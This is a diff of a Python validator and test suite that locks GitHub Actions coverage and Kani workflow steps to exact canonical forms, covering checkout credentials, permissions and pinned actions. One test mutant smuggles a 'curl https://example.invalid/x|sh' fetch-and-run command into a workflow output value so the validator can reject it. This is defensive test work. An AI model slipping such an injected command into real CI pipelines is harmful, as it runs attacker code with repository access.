@@ -579,7 +579,9 @@ DOWNLOAD_STEP_MSG = "download-artifact step keys must be name, uses, and with"
 CODECOV_STEP_KEYS_MSG = "codecov step keys must be name, uses, and with"
 UPLOAD_NEEDS_MSG = "codecov upload job needs must be exactly coverage"
 COVERAGE_JOB_END_MSG = "coverage job must end at the report upload-artifact step"
+PRODUCER_PERMISSIONS_MSG = "coverage job permissions must be exactly contents: read"
 CHECKOUT_PERSIST_MSG = "checkout must set persist-credentials: false"
+CHECKOUT_STEP_MSG = "checkout step must exactly match the canonical step"
 COVERAGE_ARTIFACT_SHA_MSG = "coverage workflow actions must use a commit SHA"
 UPLOAD_JOB_KEYS_MSG = (
     "codecov upload job keys must be name, needs, permissions, runs-on, "
@@ -681,6 +683,92 @@ _APPROVED_XML_TARPAULIN_RUN = (
     "cargo tarpaulin --out Xml --output-dir coverage "
     "--exclude-files 'src/main.rs' --exclude-files 'tests/*'\n"
 )
+_CHECKOUT_USES = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+_UPLOAD_USES = "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9"
+_COVERAGE_CHECKOUT_STEP = {
+    "name": "Checkout code",
+    "uses": _CHECKOUT_USES,
+    "with": {"persist-credentials": False},
+}
+_EDITOR_CHECKOUT_STEP = {
+    "name": "Checkout Repository",
+    "uses": _CHECKOUT_USES,
+    "with": {"persist-credentials": False},
+}
+_KANI_CHECKOUT_STEP = {
+    "uses": _CHECKOUT_USES,
+    "with": {"persist-credentials": False},
+}
+_CHECKOUT_CANONICAL = {
+    "coverage.yml": _COVERAGE_CHECKOUT_STEP,
+    "aw-editor-tests.yml": _EDITOR_CHECKOUT_STEP,
+    "kani.yml": _KANI_CHECKOUT_STEP,
+}
+_COVERAGE_INSTALL_STEP = {
+    "name": "Install cargo-tarpaulin",
+    "run": "cargo install cargo-tarpaulin --version 0.35.2 --locked",
+}
+_COVERAGE_GENERATE_STEP = {
+    "name": "Generate coverage",
+    "run": _APPROVED_XML_TARPAULIN_RUN,
+}
+_COVERAGE_UPLOAD_STEP = {
+    "name": "Upload coverage XML",
+    "uses": _UPLOAD_USES,
+    "with": {
+        "name": "coverage-xml",
+        "path": "tools/astraweave-assets/coverage/cobertura.xml",
+        "retention-days": 30,
+    },
+}
+_EDITOR_APT_STEP = {
+    "name": "Install Linux Dependencies",
+    "run": (
+        "sudo apt-get update\n"
+        "sudo apt-get install -y pkg-config libxcb-shape0-dev "
+        "libxcb-xfixes0-dev libxkbcommon-dev libegl1-mesa-dev libudev-dev "
+        "libasound2-dev\n"
+    ),
+}
+_EDITOR_INSTALL_LLVM_STEP = {
+    "name": "Install cargo-llvm-cov",
+    "run": "cargo install cargo-llvm-cov --version 0.9.1 --locked",
+}
+_EDITOR_LLVM_COV_STEP = {
+    "name": "Generate Coverage Report",
+    "run": "cargo llvm-cov --package aw_editor --lib --lcov --output-path lcov.info\n",
+}
+_EDITOR_UPLOAD_STEP = {
+    "name": "Upload coverage report",
+    "uses": _UPLOAD_USES,
+    "with": {
+        "name": "aw-editor-lcov",
+        "path": "lcov.info",
+        "retention-days": 30,
+    },
+}
+_LOCKED_PRODUCER_STEPS = {
+    "coverage.yml": {
+        "checkout": _COVERAGE_CHECKOUT_STEP,
+        "install-tarpaulin": _COVERAGE_INSTALL_STEP,
+        "xml-tarpaulin": _COVERAGE_GENERATE_STEP,
+        "upload": _COVERAGE_UPLOAD_STEP,
+    },
+    "aw-editor-tests.yml": {
+        "checkout": _EDITOR_CHECKOUT_STEP,
+        "apt": _EDITOR_APT_STEP,
+        "install-llvm": _EDITOR_INSTALL_LLVM_STEP,
+        "llvm-cov": _EDITOR_LLVM_COV_STEP,
+        "upload": _EDITOR_UPLOAD_STEP,
+    },
+}
+_KANI_TIMEOUT_STEP = {
+    "name": "Resolve harness timeout",
+    "id": "timeout",
+    "env": {"KANI_TIMEOUT_INPUT": "${{ github.event.inputs.timeout }}"},
+    "run": _KANI_TIMEOUT_RUN,
+}
+_PRODUCER_PERMISSIONS = {"contents": "read"}
 KANI_ACTION_SHA_MSG = "kani checkout and upload-artifact must use a commit SHA"
 _JOB_HEADER_RE = re.compile(r"^  ([A-Za-z0-9_-]+):\s*(?:#.*)?$")
 _LLVM_TOOL_VALUE_RE = re.compile(r"cargo-llvm-cov@[0-9]+\.[0-9]+\.[0-9]+\Z")
@@ -991,6 +1079,53 @@ def _run_text(step: object) -> str:
     return run if isinstance(run, str) else ""
 
 
+def _run_rstrip(value: object) -> str | None:
+    """`run` text with trailing whitespace removed. Leading text stays."""
+    if not isinstance(value, str):
+        return None
+    return value.rstrip()
+
+
+def _mapping_equals(actual: object, expected: dict) -> bool:
+    if not isinstance(actual, dict) or getattr(actual, "duplicate_keys", None):
+        return False
+    if set(actual) != set(expected):
+        return False
+    return all(_value_equals(actual[key], want) for key, want in expected.items())
+
+
+def _value_equals(actual: object, expected: object) -> bool:
+    if isinstance(expected, dict):
+        return _mapping_equals(actual, expected)
+    if isinstance(expected, list):
+        if not isinstance(actual, list) or len(actual) != len(expected):
+            return False
+        return all(_value_equals(got, want) for got, want in zip(actual, expected))
+    return actual == expected
+
+
+def _step_equals_canonical(step: object, canonical: dict) -> bool:
+    """The step equals the canonical step.
+
+    The key set is the same. `run` matches after trailing whitespace is
+    trimmed. Every other key and value matches, including a nested `with:`
+    or `env` map. An extra key, a changed value, or an extra run line fails.
+    """
+    if not isinstance(step, dict) or getattr(step, "duplicate_keys", None):
+        return False
+    if set(step) != set(canonical):
+        return False
+    for key, want in canonical.items():
+        got = step[key]
+        if key == "run":
+            if _run_rstrip(got) != _run_rstrip(want):
+                return False
+            continue
+        if not _value_equals(got, want):
+            return False
+    return True
+
+
 def _producer_job_keys_ok(job: object) -> bool:
     """Job keys are the allowlist. A job-level if: is not in it."""
     if not isinstance(job, dict) or getattr(job, "duplicate_keys", None):
@@ -1035,9 +1170,43 @@ def _producer_sequence_ok(job: object, workflow: str) -> bool:
     steps = job.get("steps")
     if not isinstance(steps, list) or len(steps) != len(kinds):
         return False
-    return all(
+    if not all(
         _producer_step_matches(step, kind) for step, kind in zip(steps, kinds)
-    )
+    ):
+        return False
+    return _producer_locked_exact(steps, workflow)
+
+
+def _producer_locked_exact(steps: list, workflow: str) -> bool:
+    """Each locked step equals its canonical step.
+
+    Setup and toolchain steps are identified, not pinned here. The locked
+    steps are checkout, install, generate, and upload in coverage.yml, and
+    checkout, apt, install-llvm, llvm-cov, and upload in aw-editor-tests.yml.
+    """
+    locked = _LOCKED_PRODUCER_STEPS.get(workflow)
+    kinds = _PRODUCER_STEP_KINDS.get(workflow)
+    if locked is None or kinds is None:
+        return False
+    for step, kind in zip(steps, kinds):
+        canonical = locked.get(kind)
+        if canonical is None:
+            continue
+        if not _step_equals_canonical(step, canonical):
+            return False
+    return True
+
+
+def _producer_permissions_exact(job: object) -> bool:
+    """The producer permissions map is exactly contents: read."""
+    if not isinstance(job, dict):
+        return False
+    perms = job.get("permissions", _MISSING)
+    if not isinstance(perms, dict) or getattr(perms, "duplicate_keys", None):
+        return False
+    if set(perms) != set(_PRODUCER_PERMISSIONS):
+        return False
+    return all(perms.get(key) == value for key, value in _PRODUCER_PERMISSIONS.items())
 
 
 def _producer_upload_name_ok(job: object, artifact_name: str) -> bool:
@@ -1135,11 +1304,15 @@ def coverage_permission_violations(text: str, *, path: str = "") -> list[str]:
     The upload job's keys are exactly name, needs, permissions, runs-on,
     timeout-minutes, and steps. needs is exactly the job coverage. The
     coverage job's keys are name, permissions, runs-on, timeout-minutes,
-    and steps. Its last step is the upload-artifact whose with.name is the
-    pinned report. A job-level if:, a step if:, a later step, a different
-    artifact name, a generate-coverage script other than the approved
-    cargo tarpaulin --out Xml command, or a step between the editor
-    cargo llvm-cov run and the lcov upload fails. The upload
+    and steps. Its permissions map is exactly contents: read. An added,
+    removed, or changed scope fails. Its last step is the upload-artifact
+    whose with.name is the pinned report. A job-level if:, a step if:, a
+    later step, a different artifact name, or a locked step that is not
+    the canonical step fails. The key set matches, run matches after
+    trailing whitespace is trimmed, and every other value matches,
+    including the upload with: map. A generate-coverage script other than
+    the approved cargo tarpaulin --out Xml command, or a step between the
+    editor cargo llvm-cov run and the lcov upload, fails. The upload
     job's steps are actions/download-artifact, with exactly name and path,
     plus the SHA-pinned Codecov action. That download step's keys are only
     name, uses, and with, and its name is the pinned report artifact. Its
@@ -1184,6 +1357,8 @@ def coverage_permission_violations(text: str, *, path: str = "") -> list[str]:
         has_codecov = _job_has_codecov(job)
         job_perms = job.get("permissions", _MISSING)
         perm_line = int(getattr(job, "key_lines", {}).get("permissions", job_line))
+        if job_id == "coverage" and not _producer_permissions_exact(job):
+            violations.append(f"{prefix}{perm_line}: {PRODUCER_PERMISSIONS_MSG}")
         if job_perms is not _MISSING and job_perms is not None:
             found = _permission_value_violations(
                 job_perms,
@@ -1338,11 +1513,12 @@ def kani_dispatch_args_violations(text: str, *, path: str = "") -> list[str]:
 
 
 def kani_timeout_run_violations(text: str, *, path: str = "") -> list[str]:
-    """Each Kani job's timeout step run text is the approved script.
+    """Each Kani job's timeout step equals the canonical step.
 
-    The script writes `value=$raw` once, after the allowlist case. A second
-    output write is a different script, even when the case text is still
-    present.
+    The keys are name, id, env, and run. env is exactly
+    KANI_TIMEOUT_INPUT set to github.event.inputs.timeout. run matches the
+    approved script after trailing whitespace is trimmed. An extra key, a
+    changed env value, or an extra run line fails.
     """
     prefix = f"{path}: " if path else ""
     doc, err = load_workflow_yaml(text)
@@ -1361,7 +1537,7 @@ def kani_timeout_run_violations(text: str, *, path: str = "") -> list[str]:
     violations: list[str] = []
     for job_id in sorted(kani_jobs):
         steps = timeout_steps.get(job_id, [])
-        if len(steps) == 1 and steps[0].get("run") == _KANI_TIMEOUT_RUN:
+        if len(steps) == 1 and _step_equals_canonical(steps[0], _KANI_TIMEOUT_STEP):
             continue
         line_no = _step_line(steps[0]) if steps else 1
         violations.append(f"{prefix}{line_no}: {KANI_TIMEOUT_MSG}")
@@ -1383,7 +1559,11 @@ def _plain_word_false(mapping: object, key: str) -> bool:
 
 
 def checkout_persist_credentials_violations(text: str, *, path: str = "") -> list[str]:
-    """coverage.yml, aw-editor-tests.yml, and kani.yml checkouts set persist-credentials: false."""
+    """coverage.yml, aw-editor-tests.yml, and kani.yml checkouts match the canonical step.
+
+    persist-credentials is the plain boolean false. The with: map is that
+    key alone. repository, ref, token, and an extra run line fail.
+    """
     if Path(path).name not in _CHECKOUT_PERSIST_WORKFLOWS:
         return []
     prefix = f"{path}: " if path else ""
@@ -1399,6 +1579,9 @@ def checkout_persist_credentials_violations(text: str, *, path: str = "") -> lis
         body = step.get("with")
         if _mapping_has_duplicate(body) or not _plain_word_false(body, "persist-credentials"):
             violations.append(f"{prefix}{_step_line(step)}: {CHECKOUT_PERSIST_MSG}")
+        canonical = _CHECKOUT_CANONICAL[Path(path).name]
+        if not _step_equals_canonical(step, canonical):
+            violations.append(f"{prefix}{_step_line(step)}: {CHECKOUT_STEP_MSG}")
     return violations
 
 
@@ -2980,7 +3163,10 @@ jobs:
         )
         self.assertEqual(
             coverage_permission_violations(contents, path="coverage.yml"),
-            [f"coverage.yml: {contents_line}: {COVERAGE_WRITE_MSG}"],
+            [
+                f"coverage.yml: {contents_line - 1}: {PRODUCER_PERMISSIONS_MSG}",
+                f"coverage.yml: {contents_line}: {COVERAGE_WRITE_MSG}",
+            ],
         )
         actions = editor.replace(
             "      contents: read\n",
@@ -4500,6 +4686,554 @@ jobs:
             mutant = mutant.replace(expr, stripped, 1)
         with self.assertRaises(AssertionError):
             assert_alert_followup_runs(mutant)
+
+    def _coverage_job(self, text: str, path: str) -> dict:
+        doc, err = load_workflow_yaml(text)
+        self.assertIsNone(err, path)
+        job = doc["jobs"]["coverage"]
+        self.assertIsInstance(job, dict, path)
+        return job
+
+    def _assert_producer_rejected(self, text: str, path: str, label: str) -> dict:
+        self.assertNotEqual(text, (WORKFLOWS / path).read_text(encoding="utf-8"), label)
+        job = self._coverage_job(text, f"{path}:{label}")
+        messages = " ".join(coverage_permission_violations(text, path=path))
+        self.assertIn(COVERAGE_JOB_END_MSG, messages, f"{path}:{label}")
+        return job
+
+    def test_locked_steps_equal_their_canonical_steps(self) -> None:
+        """Live locked steps match the canonical key set and values."""
+        coverage = self._coverage_job(
+            (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8"),
+            "coverage.yml",
+        )
+        editor = self._coverage_job(
+            (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8"),
+            "aw-editor-tests.yml",
+        )
+        for workflow, job in (("coverage.yml", coverage), ("aw-editor-tests.yml", editor)):
+            kinds = _PRODUCER_STEP_KINDS[workflow]
+            self.assertEqual(len(job["steps"]), len(kinds), workflow)
+            for step, kind in zip(job["steps"], kinds):
+                canonical = _LOCKED_PRODUCER_STEPS[workflow].get(kind)
+                if canonical is None:
+                    continue
+                self.assertTrue(
+                    _step_equals_canonical(step, canonical),
+                    f"{workflow}:{kind}",
+                )
+            self.assertTrue(_producer_permissions_exact(job), workflow)
+        for name in ("coverage.yml", "aw-editor-tests.yml", "kani.yml"):
+            text = (WORKFLOWS / name).read_text(encoding="utf-8")
+            doc, err = load_workflow_yaml(text)
+            self.assertIsNone(err, name)
+            canonical = _CHECKOUT_CANONICAL[name]
+            seen = 0
+            for _job_id, _job, step in _iter_steps(doc):
+                if not _is_named_action(step, "actions/checkout"):
+                    continue
+                seen += 1
+                self.assertTrue(_step_equals_canonical(step, canonical), f"{name}:{seen}")
+            self.assertGreater(seen, 0, name)
+        kani, kani_err = load_workflow_yaml((WORKFLOWS / "kani.yml").read_text(encoding="utf-8"))
+        self.assertIsNone(kani_err)
+        timeouts = [
+            step
+            for _job_id, _job, step in _iter_steps(kani)
+            if step.get("id") == "timeout"
+        ]
+        self.assertEqual(len(timeouts), 4)
+        for step in timeouts:
+            self.assertTrue(_step_equals_canonical(step, _KANI_TIMEOUT_STEP))
+
+    def test_locked_steps_reject_an_extra_key_and_run_line(self) -> None:
+        """Each locked step rejects an extra key and an extra run line.
+
+        The extra key keeps the approved run text, so a run-only compare
+        accepts it. The extra run line keeps the canonical key set, so a
+        key-set compare accepts it.
+        """
+        coverage = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
+        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
+        kani = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
+        cases = (
+            (
+                "coverage install",
+                "coverage.yml",
+                coverage,
+                "      - name: Install cargo-tarpaulin\n"
+                "        run: cargo install cargo-tarpaulin --version 0.35.2 --locked\n"
+                "      \n"
+                "      - name: Generate coverage\n",
+                "      - name: Install cargo-tarpaulin\n"
+                "        shell: bash\n"
+                "        run: cargo install cargo-tarpaulin --version 0.35.2 --locked\n"
+                "      \n"
+                "      - name: Generate coverage\n",
+                "      - name: Install cargo-tarpaulin\n"
+                "        run: |\n"
+                "          cargo install cargo-tarpaulin --version 0.35.2 --locked\n"
+                "          echo extra\n"
+                "      \n"
+                "      - name: Generate coverage\n",
+                "install-tarpaulin",
+            ),
+            (
+                "generate",
+                "coverage.yml",
+                coverage,
+                "      - name: Generate coverage\n"
+                "        run: |\n"
+                "          cd tools/astraweave-assets\n"
+                "          cargo tarpaulin --out Xml --output-dir coverage "
+                "--exclude-files 'src/main.rs' --exclude-files 'tests/*'\n",
+                "      - name: Generate coverage\n"
+                "        shell: bash\n"
+                "        run: |\n"
+                "          cd tools/astraweave-assets\n"
+                "          cargo tarpaulin --out Xml --output-dir coverage "
+                "--exclude-files 'src/main.rs' --exclude-files 'tests/*'\n",
+                "      - name: Generate coverage\n"
+                "        run: |\n"
+                "          cd tools/astraweave-assets\n"
+                "          cargo tarpaulin --out Xml --output-dir coverage "
+                "--exclude-files 'src/main.rs' --exclude-files 'tests/*'\n"
+                "          echo extra\n",
+                "xml-tarpaulin",
+            ),
+            (
+                "upload",
+                "coverage.yml",
+                coverage,
+                "      - name: Upload coverage XML\n"
+                "        uses: actions/upload-artifact@"
+                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n",
+                "      - name: Upload coverage XML\n"
+                "        shell: bash\n"
+                "        uses: actions/upload-artifact@"
+                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n",
+                "      - name: Upload coverage XML\n"
+                "        run: echo extra\n"
+                "        uses: actions/upload-artifact@"
+                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n",
+                "upload",
+            ),
+            (
+                "editor upload",
+                "aw-editor-tests.yml",
+                editor,
+                "    - name: Upload coverage report\n"
+                "      uses: actions/upload-artifact@"
+                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n",
+                "    - name: Upload coverage report\n"
+                "      shell: bash\n"
+                "      uses: actions/upload-artifact@"
+                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n",
+                "    - name: Upload coverage report\n"
+                "      run: echo extra\n"
+                "      uses: actions/upload-artifact@"
+                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n",
+                "upload",
+            ),
+            (
+                "apt",
+                "aw-editor-tests.yml",
+                editor,
+                "    - name: Install Linux Dependencies\n"
+                "      run: |\n"
+                "        sudo apt-get update\n"
+                "        sudo apt-get install -y pkg-config libxcb-shape0-dev "
+                "libxcb-xfixes0-dev libxkbcommon-dev libegl1-mesa-dev "
+                "libudev-dev libasound2-dev\n",
+                "    - name: Install Linux Dependencies\n"
+                "      shell: bash\n"
+                "      run: |\n"
+                "        sudo apt-get update\n"
+                "        sudo apt-get install -y pkg-config libxcb-shape0-dev "
+                "libxcb-xfixes0-dev libxkbcommon-dev libegl1-mesa-dev "
+                "libudev-dev libasound2-dev\n",
+                "    - name: Install Linux Dependencies\n"
+                "      run: |\n"
+                "        sudo apt-get update\n"
+                "        sudo apt-get install -y pkg-config libxcb-shape0-dev "
+                "libxcb-xfixes0-dev libxkbcommon-dev libegl1-mesa-dev "
+                "libudev-dev libasound2-dev\n"
+                "        echo extra\n",
+                "apt",
+            ),
+            (
+                "install-llvm",
+                "aw-editor-tests.yml",
+                editor,
+                "    - name: Install cargo-llvm-cov\n"
+                "      run: cargo install cargo-llvm-cov --version 0.9.1 --locked\n",
+                "    - name: Install cargo-llvm-cov\n"
+                "      shell: bash\n"
+                "      run: cargo install cargo-llvm-cov --version 0.9.1 --locked\n",
+                "    - name: Install cargo-llvm-cov\n"
+                "      run: |\n"
+                "        cargo install cargo-llvm-cov --version 0.9.1 --locked\n"
+                "        echo extra\n",
+                "install-llvm",
+            ),
+            (
+                "llvm-cov",
+                "aw-editor-tests.yml",
+                editor,
+                "    - name: Generate Coverage Report\n"
+                "      run: |\n"
+                "        cargo llvm-cov --package aw_editor --lib --lcov --output-path lcov.info\n",
+                "    - name: Generate Coverage Report\n"
+                "      shell: bash\n"
+                "      run: |\n"
+                "        cargo llvm-cov --package aw_editor --lib --lcov --output-path lcov.info\n",
+                "    - name: Generate Coverage Report\n"
+                "      run: |\n"
+                "        cargo llvm-cov --package aw_editor --lib --lcov --output-path lcov.info\n"
+                "        echo TN: > lcov.info\n",
+                "llvm-cov",
+            ),
+        )
+        for label, path, text, anchor, extra_key, extra_run, kind in cases:
+            self.assertEqual(text.count(anchor), 1, label)
+            keyed = text.replace(anchor, extra_key, 1)
+            job = self._assert_producer_rejected(keyed, path, f"{label}:key")
+            step = next(
+                item
+                for item, step_kind in zip(job["steps"], _PRODUCER_STEP_KINDS[path])
+                if step_kind == kind
+            )
+            self.assertIn("shell", step, label)
+            canonical = _LOCKED_PRODUCER_STEPS[path][kind]
+            self.assertEqual(_run_rstrip(step.get("run")), _run_rstrip(canonical.get("run")), label)
+            self.assertFalse(_step_equals_canonical(step, canonical), label)
+            lined = text.replace(anchor, extra_run, 1)
+            job = self._assert_producer_rejected(lined, path, f"{label}:run")
+            step = next(
+                item
+                for item, step_kind in zip(job["steps"], _PRODUCER_STEP_KINDS[path])
+                if step_kind == kind
+            )
+            self.assertNotIn("shell", step, label)
+            self.assertNotEqual(
+                _run_rstrip(step.get("run")),
+                _run_rstrip(canonical.get("run")),
+                label,
+            )
+
+    def test_upload_and_checkout_with_values_are_exact(self) -> None:
+        """A changed or extra with: value fails on the upload and the checkout."""
+        coverage = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
+        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
+        kani = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
+        changed_path = coverage.replace(
+            "          path: tools/astraweave-assets/coverage/cobertura.xml\n",
+            "          path: README.md\n",
+            1,
+        )
+        job = self._assert_producer_rejected(changed_path, "coverage.yml", "upload path")
+        upload = job["steps"][-1]
+        self.assertEqual(_ci_item(upload.get("with"), "name")[1], "coverage-xml")
+        self.assertEqual(_ci_item(upload.get("with"), "path")[1], "README.md")
+        self.assertTrue(_producer_upload_name_ok(job, "coverage-xml"))
+        self.assertFalse(_step_equals_canonical(upload, _COVERAGE_UPLOAD_STEP))
+        ignored = coverage.replace(
+            "          path: tools/astraweave-assets/coverage/cobertura.xml\n"
+            "          retention-days: 30\n",
+            "          path: tools/astraweave-assets/coverage/cobertura.xml\n"
+            "          if-no-files-found: ignore\n"
+            "          retention-days: 30\n",
+            1,
+        )
+        job = self._assert_producer_rejected(ignored, "coverage.yml", "upload ignore")
+        upload = job["steps"][-1]
+        self.assertIn("if-no-files-found", upload.get("with"))
+        self.assertTrue(_producer_upload_name_ok(job, "coverage-xml"))
+        editor_path = editor.replace("        path: lcov.info\n", "        path: README.md\n", 1)
+        job = self._assert_producer_rejected(editor_path, "aw-editor-tests.yml", "editor path")
+        self.assertEqual(_ci_item(job["steps"][-1].get("with"), "path")[1], "README.md")
+        self.assertTrue(_producer_upload_name_ok(job, "aw-editor-lcov"))
+        checkout_forms = {
+            "coverage.yml": (
+                coverage,
+                "        with:\n          persist-credentials: false\n",
+                "        with:\n"
+                "          persist-credentials: false\n"
+                "          repository: example/astraweave\n"
+                "          ref: main\n"
+                "          token: ${{ secrets.GITHUB_TOKEN }}\n",
+            ),
+            "aw-editor-tests.yml": (
+                editor,
+                "      with:\n        persist-credentials: false\n",
+                "      with:\n"
+                "        persist-credentials: false\n"
+                "        repository: example/astraweave\n"
+                "        ref: main\n"
+                "        token: ${{ secrets.GITHUB_TOKEN }}\n",
+            ),
+            "kani.yml": (
+                kani,
+                "        with:\n          persist-credentials: false\n",
+                "        with:\n"
+                "          persist-credentials: false\n"
+                "          repository: example/astraweave\n"
+                "          ref: main\n"
+                "          token: ${{ secrets.GITHUB_TOKEN }}\n",
+            ),
+        }
+        for path, (text, checkout_anchor, extra_with) in checkout_forms.items():
+            self.assertGreaterEqual(text.count(checkout_anchor), 1, path)
+            mutant = text.replace(checkout_anchor, extra_with, 1)
+            self.assertNotEqual(mutant, text, path)
+            violations = checkout_persist_credentials_violations(mutant, path=path)
+            self.assertTrue(violations, path)
+            self.assertIn(CHECKOUT_STEP_MSG, " ".join(violations), path)
+            self.assertNotIn(CHECKOUT_PERSIST_MSG, " ".join(violations), path)
+            doc, err = load_workflow_yaml(mutant)
+            self.assertIsNone(err, path)
+            step = next(
+                item
+                for _job_id, _job, item in _iter_steps(doc)
+                if _is_named_action(item, "actions/checkout")
+            )
+            body = step.get("with")
+            self.assertEqual(
+                sorted(body),
+                ["persist-credentials", "ref", "repository", "token"],
+                path,
+            )
+            self.assertFalse(_step_equals_canonical(step, _CHECKOUT_CANONICAL[path]), path)
+
+    def test_checkout_and_timeout_reject_an_extra_key_and_run_line(self) -> None:
+        """Checkout and the Kani timeout step reject an extra key and a run line."""
+        kani = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
+        checkout = (
+            "      - uses: actions/checkout@"
+            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+            "        with:\n"
+            "          persist-credentials: false\n"
+        )
+        self.assertEqual(kani.count(checkout), 4)
+        keyed = kani.replace(
+            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n        with:\n",
+            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n        shell: bash\n        with:\n",
+            1,
+        )
+        self.assertNotEqual(keyed, kani)
+        keyed_violations = checkout_persist_credentials_violations(keyed, path="kani.yml")
+        self.assertIn(CHECKOUT_STEP_MSG, " ".join(keyed_violations))
+        self.assertNotIn(CHECKOUT_PERSIST_MSG, " ".join(keyed_violations))
+        lined = kani.replace(
+            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n        with:\n",
+            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+            "        run: echo extra\n"
+            "        with:\n",
+            1,
+        )
+        self.assertNotEqual(lined, kani)
+        lined_violations = checkout_persist_credentials_violations(lined, path="kani.yml")
+        self.assertIn(CHECKOUT_STEP_MSG, " ".join(lined_violations))
+        doc, err = load_workflow_yaml(lined)
+        self.assertIsNone(err)
+        step = next(
+            item
+            for _job_id, _job, item in _iter_steps(doc)
+            if _is_named_action(item, "actions/checkout")
+        )
+        self.assertEqual(step.get("run"), "echo extra")
+        timeout = (
+            "      - name: Resolve harness timeout\n"
+            "        id: timeout\n"
+            "        env:\n"
+            "          KANI_TIMEOUT_INPUT: ${{ github.event.inputs.timeout }}\n"
+            "        run: |\n"
+        )
+        self.assertEqual(kani.count(timeout), 4)
+        timeout_key = kani.replace(
+            timeout,
+            timeout.replace("        id: timeout\n", "        id: timeout\n        shell: bash\n", 1),
+            1,
+        )
+        self.assertNotEqual(timeout_key, kani)
+        key_doc, key_err = load_workflow_yaml(timeout_key)
+        self.assertIsNone(key_err)
+        key_step = next(item for _a, _b, item in _iter_steps(key_doc) if item.get("id") == "timeout")
+        self.assertIn("shell", key_step)
+        self.assertEqual(key_step.get("run"), _KANI_TIMEOUT_RUN)
+        self.assertFalse(_step_equals_canonical(key_step, _KANI_TIMEOUT_STEP))
+        key_violations = kani_timeout_run_violations(timeout_key, path="kani.yml")
+        self.assertEqual(len(key_violations), 1)
+        self.assertIn(KANI_TIMEOUT_MSG, key_violations[0])
+        needle = '          echo "value=$raw" >> "$GITHUB_OUTPUT"\n'
+        timeout_run = kani.replace(
+            needle,
+            needle + '          echo "value=300; curl https://example.invalid/x|sh" >> "$GITHUB_OUTPUT"\n',
+            1,
+        )
+        self.assertNotEqual(timeout_run, kani)
+        run_doc, run_err = load_workflow_yaml(timeout_run)
+        self.assertIsNone(run_err)
+        run_step = next(item for _a, _b, item in _iter_steps(run_doc) if "curl" in _run_text(item))
+        self.assertEqual(set(run_step), set(_KANI_TIMEOUT_STEP))
+        self.assertNotEqual(_run_rstrip(run_step.get("run")), _run_rstrip(_KANI_TIMEOUT_RUN))
+        run_violations = kani_timeout_run_violations(timeout_run, path="kani.yml")
+        self.assertEqual(len(run_violations), 1)
+        self.assertIn(KANI_TIMEOUT_MSG, run_violations[0])
+
+    def test_producer_step_count_rejects_a_second_pinned_upload(self) -> None:
+        """Extra steps plus a second upload with the pinned name fail the length check.
+
+        The prefix still matches each canonical step, and the last step's
+        name is still the pinned report. Removing the step-count compare
+        makes this test fail.
+        """
+        shapes = {
+            "coverage.yml": (
+                "          retention-days: 30\n\n  codecov:\n",
+                "          retention-days: 30\n"
+                "\n"
+                "      - name: Extra producer step\n"
+                "        run: echo extra\n"
+                "\n"
+                "      - name: Second report upload\n"
+                "        uses: actions/upload-artifact@"
+                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n"
+                "        with:\n"
+                "          name: coverage-xml\n"
+                "          path: tools/astraweave-assets/coverage/cobertura.xml\n"
+                "          retention-days: 30\n"
+                "\n"
+                "  codecov:\n",
+                "coverage-xml",
+            ),
+            "aw-editor-tests.yml": (
+                "        retention-days: 30\n\n  codecov:\n",
+                "        retention-days: 30\n"
+                "\n"
+                "    - name: Extra producer step\n"
+                "      run: echo extra\n"
+                "\n"
+                "    - name: Second report upload\n"
+                "      uses: actions/upload-artifact@"
+                "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n"
+                "      with:\n"
+                "        name: aw-editor-lcov\n"
+                "        path: lcov.info\n"
+                "        retention-days: 30\n"
+                "\n"
+                "  codecov:\n",
+                "aw-editor-lcov",
+            ),
+        }
+        for path, (anchor, replacement, artifact) in shapes.items():
+            text = (WORKFLOWS / path).read_text(encoding="utf-8")
+            self.assertEqual(text.count(anchor), 1, path)
+            mutant = text.replace(anchor, replacement, 1)
+            job = self._assert_producer_rejected(mutant, path, "step count")
+            kinds = _PRODUCER_STEP_KINDS[path]
+            self.assertGreater(len(job["steps"]), len(kinds), path)
+            self.assertTrue(
+                all(
+                    _producer_step_matches(step, kind)
+                    for step, kind in zip(job["steps"], kinds)
+                ),
+                path,
+            )
+            self.assertTrue(_producer_locked_exact(job["steps"], path), path)
+            self.assertTrue(_producer_upload_name_ok(job, artifact), path)
+            self.assertTrue(_producer_steps_unconditional(job), path)
+            self.assertTrue(_producer_job_keys_ok(job), path)
+            self.assertFalse(_producer_sequence_ok(job, path), path)
+
+    def test_llvm_cov_kind_rejects_a_replaced_editor_step(self) -> None:
+        """The llvm-cov kind check is the cargo llvm-cov prefix.
+
+        Returning True for every step fails the negative assertion.
+        Deleting the branch fails the positive assertion. The step count
+        and the pinned upload name stay, so this is not the length check.
+        """
+        text = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
+        live = self._coverage_job(text, "aw-editor-tests.yml")
+        kinds = _PRODUCER_STEP_KINDS["aw-editor-tests.yml"]
+        live_step = next(
+            step for step, kind in zip(live["steps"], kinds) if kind == "llvm-cov"
+        )
